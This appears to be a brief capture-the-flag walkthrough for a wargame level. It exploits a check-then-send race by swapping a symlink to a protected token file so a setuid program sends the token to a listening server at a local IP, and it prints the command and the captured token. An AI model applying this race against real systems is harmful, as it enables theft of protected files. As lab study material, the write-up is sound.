We need a server to listen on a port 6969
Well we did mini_serv for an exam, better put it to some use !

on the VM we found that the file is acces for permission check a lot before it is send
we just need to change the file in bewteen the check and the send
using a small script who change a link to a file whe have permission and the token (script_ln.sh)
while the script is doing it's work we can launch flag10
`
	./level10 /tmp/link 192.168.56.1
`

a client connected to our mini_serv will get the token (may need a few try)
```
	server: client 10 just arrived
	client 10: .*( )*.
	client 10: woupa2yuojeeaaed06riuj63c
	server: client 10 just left
```
